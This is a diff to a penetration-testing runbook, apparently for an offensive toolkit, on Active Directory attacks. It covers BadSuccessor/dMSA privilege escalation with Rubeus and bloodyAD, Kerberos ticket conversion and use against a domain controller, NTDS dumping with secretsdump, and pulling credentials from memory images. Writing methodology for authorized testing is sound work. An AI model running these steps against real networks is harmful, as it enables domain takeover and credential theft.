@@ -45,6 +45,34 @@ the fixes; you mostly need to *pick the right auth*.
   sign+**seal** (SSF 256) over plain 389: `ldapsearch`/`ldapmodify`/`ldapadd
   -Y GSSAPI -H ldap://<dc-fqdn>` after `krbconf <dc>` + a TGT in `KRB5CCNAME`
   (snippet below). This is the only Linux path in the kit for confidential LDAP.
+- **Don't infer the *environment* from a *failing tool*.** A tool error means
+  "this tool failed", not "the box is hardened/patched". A stale or wrong-flag
+  binary throws KDC/LDAP errors that look exactly like a defended DC — and a wrong
+  "it's patched" call sends you down a fake alternate path. **Before concluding the
+  environment blocks a technique, prove the tool actually implements it** (banner
+  version + `--help`/`-h`), then re-test. The classic trap: a binary that silently
+  ignores a flag it's too old to support and returns a generic `KDC_ERR_*`/LDAP
+  error — it reads identically to a patched/hardened DC and sends you down a fake
+  alternate path. Confirm the build supports the technique before blaming the box.
+- **Windows .NET tooling goes stale silently.** GhostPack (Rubeus/Certify/Seatbelt)
+  ships on `main` without tagging releases, so tag-tracking registries (incl. Forge
+  via `roo tools`) serve year-old binaries that lack recent techniques. Pull a
+  **main/branch build** (`roo tools get … ` prefers it; or SharpCollection / compile)
+  and **verify the banner version on the box** before trusting output. See **wintools**.
+- **Short-lived Kerberos tickets die mid-transfer, and SMB honors that.** Service /
+  S4U / dMSA tickets default to a short lifetime (~10–15 min); a ticket-backed
+  transfer drops with `STATUS_NETWORK_SESSION_EXPIRED` once it ages out — SMB
+  re-validates, it does *not* ride out the original session. For large loot (VM
+  images, NTDS dumps) pull faster than the window or re-mint per chunk; don't assume
+  a started download will finish.
+- **Consuming a ticket — switch clients, don't surgery the ccache.** Kerberos
+  clients differ in tolerance: python-gssapi tools (`evil-winrm-py`, `certipy`) are
+  strict about realm case / ccache form, where tolerant ones (`nxc -k --use-kcache`,
+  ruby `evil-winrm -r <realm>`) accept an impacket-converted ccache as-is. If one
+  client rejects a valid ticket, **try another client** — don't hand-edit the ccache
+  (uppercasing realms, etc.): that "fixes" the local lookup but breaks the KDC
+  exchange (`KDC reply did not match expectations`) and burns time. Same rule as the
+  sealing table below — use the tool that works, not the one you have to repair.
 
 ### Prescriptive: reach for the tool that *seals* — don't debug the one that can't
 
@@ -202,16 +230,76 @@ the enumeration pick):
 - **AD CS ESC1–16** — `certipy find -ldap-scheme ldap -vulnerable` → `certipy req`/`auth`.
 - **ACL abuse** — `GenericAll`/`WriteDACL`/`ForceChangePassword`/AddSelf/write-membership
   on a user, group, GPO, or computer (`bloodyAD set …`, `owneredit`, `rbcd`).
-- **dMSA / BadSuccessor** (Server 2025) — a writable OU's `CreateChild` + a KDS root
-  key. Audit `nxc -M badsuccessor`, confirm the ACE + key, exploit with
-  `bloodyAD`/`badsuccessor.py`. *(Worked example of rule 2: three preconditions,
-  not one signal — see the engagement report for the per-box detail.)*
+- **dMSA / BadSuccessor** (Server 2025, build 26100) — a writable OU's `CreateChild`
+  + a KDS root key. Audit `nxc -M badsuccessor`, confirm the ACE + key, then see the
+  **dMSA/BadSuccessor mechanics** sub-runbook below (the operational detail bites).
 - **DCSync** — replication rights → `secretsdump.py` for the whole domain (endgame).
 
 Keep box-specific findings (which ACE, which template, which OU) in the
 `recon-results` report — this runbook stays technique-agnostic on purpose.
 
+### dMSA / BadSuccessor mechanics (durable — the technique, not a box)
+
+The KDC lets a dMSA "supersede" an account and inherit its privileges. Exploiting
+it cleanly has several non-obvious gates; verify each before blaming the box:
+
+1. **Patched vs unpatched decides the target.** *Unpatched* (pre-Aug-2025): a
+   one-way link works — supersede a DA directly (only the dMSA-side attributes
+   matter, no rights on the victim). *Patched* (BetterSuccessor): the KDC validates
+   the link **bidirectionally**, so you must also write the victim side → you can
+   only supersede an account you have **`GenericWrite`** over. So: enumerate what you
+   can write *first*, and let that pick the target (often a service account that
+   reaches the loot, not a DA).
+2. **Create + verify the attributes** (`SharpSuccessor` on Windows, or `bloodyAD
+   add badSuccessor`). Before touching Kerberos, confirm on the dMSA:
+   `msDS-DelegatedMSAState = 2` and `msDS-ManagedAccountPrecededByLink → victim`
+   (and on a patched DC, the victim's `msDS-SupersededManagedAccountLink/State`).
+   A read as the *creator* (you may need its own ticket — the OU can deny others
+   read) settles "did the write land" vs "is the KDC refusing".
+3. **Pull the ticket — two steps, Windows, `/opsec`.** With a **current Rubeus
+   build** (verify the banner — older builds silently no-op `/dmsa`): `tgtdeleg` →
+   `asktgs /dmsa /service:krbtgt/<realm>` (the dMSA TGT) → then a **second**
+   `asktgs /dmsa /service:<spn>` for each service you want (cifs/HTTP/…). The
+   inherited PAC rides the `/dmsa`-minted *service* ticket — don't let Windows
+   auto-derive it. Keep `/opsec` (some builds NullRef without it; the "delegated
+   TGT" detour it prints is harmless).
+4. **Consume it remotely, not on the target.** See §5's loopback rule — on the DC
+   the ticket is ignored. Export the service ticket and use it from the toolbox.
+5. **Mind the ~15-min lifetime** (footgun cheat-sheet) for any large transfer.
+
+If the ticket issues but every access is denied, the likely cause is loopback (§5)
+or a stale Rubeus (footgun) — *not* a patched inheritance, until you've ruled those
+out from the toolbox.
+
 ### 5. Foothold & shells
+
+**Establish topology before you consume a ticket (loopback rule — read first).**
+Know *where you are executing* relative to the target: the **Linux toolbox** (a
+remote attacker box over the VPN), a **domain workstation**, or **the target host
+itself**. It changes everything:
+
+- If your foothold shell is **on the target host** (e.g. an interactive shell on
+  the DC) and you inject a Kerberos ticket then access **that same host by name**
+  (`\\DC01\…`, WinRM to `DC01`), it's **loopback**: Windows services it with your
+  *local token*, silently ignoring the injected ticket. Symptom: the ticket sits in
+  `klist`, but access is `Access denied` / `0x8009030e` / "logon session does not
+  exist". You can burn hours blaming the ticket/inheritance — it's the loopback.
+- **Fix: consume the ticket from a *different* machine.** The **toolbox is your
+  remote box** — mint the ticket on Windows, then drive `nxc`/`smbclient`/`evil-winrm`
+  from `roo shell` over the VPN, where the DC evaluates the ticket's PAC for real.
+  (Typical tell: an injected cifs service ticket is `Access denied` for a share when
+  used *on* the DC, then reads fine the instant it's consumed from the toolbox.)
+
+Bridge a Windows-minted ticket (Rubeus base64 / `.kirbi`) into the toolbox:
+```bash
+scripts/roo shell sh -c '
+DC=<dc-ip>; FQDN=DC01.<domain>; krbconf $DC; clocksync $DC
+base64 -d ticket.b64 > /tmp/t.kirbi && ticketConverter.py /tmp/t.kirbi /tmp/t.ccache
+export KRB5CCNAME=/tmp/t.ccache
+nxc smb $FQDN -k --use-kcache --shares           # remote → PAC honored, no loopback
+smbclient.py -k -no-pass -dc-ip $DC <domain>/<dmsa>\$@$FQDN   # then: use <share>; get <file>
+'
+```
 
 ```bash
 scripts/roo shell nxc winrm $DC -u $U -p $P          # Pwn3d! ⇒ this user can WinRM
@@ -231,8 +319,15 @@ scripts/roo shell secretsdump.py <realm>/<user>:'<pass>'@<dc>      # SAM/LSA/NTD
 ```
 
 With DA/replication, `secretsdump` dumps NTDS (every hash → golden ticket, full
-persistence). Then loot the previously-denied shares (e.g. `VMBackups`) and the
-DPAPI/credential stores. Record every hash and internal IP as a pivot seed.
+persistence). Then loot the previously-denied shares (backup/admin shares, dev
+drops) and the DPAPI/credential stores. Record every hash and internal IP as a
+pivot seed.
+
+A backup share often holds a **memory image** (`.vmem`/`.dmp`) or VM snapshot of a
+privileged host — hand it to the **memforensics** skill (`roo vol <image> creds`)
+to pull SAM/LSA/cached creds out of RAM; recovered hashes loop back to the spray/
+PTH flow above. (This can *be* the privesc — a member server's `.vmem` → local
+Administrator hash → PTH to the DC — not just post-DA collection.)
 
 ## Tooling reference
 
